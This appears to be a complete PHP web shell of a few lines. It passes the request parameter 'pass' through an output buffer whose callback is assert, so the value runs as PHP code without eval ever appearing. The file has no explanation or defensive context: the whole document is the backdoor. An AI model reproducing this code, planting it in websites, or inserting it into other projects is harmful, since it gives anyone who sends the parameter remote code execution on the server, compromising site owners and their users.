<?php
ob_start('assert');
echo $_REQUEST['pass'];
ob_end_flush();
?>